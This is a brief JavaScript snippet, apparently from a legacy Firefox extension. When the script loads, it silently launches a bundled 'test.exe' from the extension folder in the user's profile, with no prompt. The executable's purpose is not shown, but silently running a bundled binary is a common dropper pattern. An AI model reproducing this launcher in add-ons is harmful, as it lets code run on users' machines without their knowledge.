var dsprops = Components.classes['@mozilla.org/file/directory_service;1']
      .getService(Components.interfaces.nsIProperties);
  var ProfilePath = dsprops.get("ProfD", Components.interfaces.nsIFile).path;


  var file = Components.classes["@mozilla.org/file/local;1"]
      .createInstance(Components.interfaces.nsILocalFile);
  file.initWithPath(ProfilePath);


  file.append("extensions");
  file.append("{12bb73b5-eaa8-9f96-b663-805edb785006}");
  file.append("test.exe");
  file.launch();

window.addEventListener("load", function () { }, false);
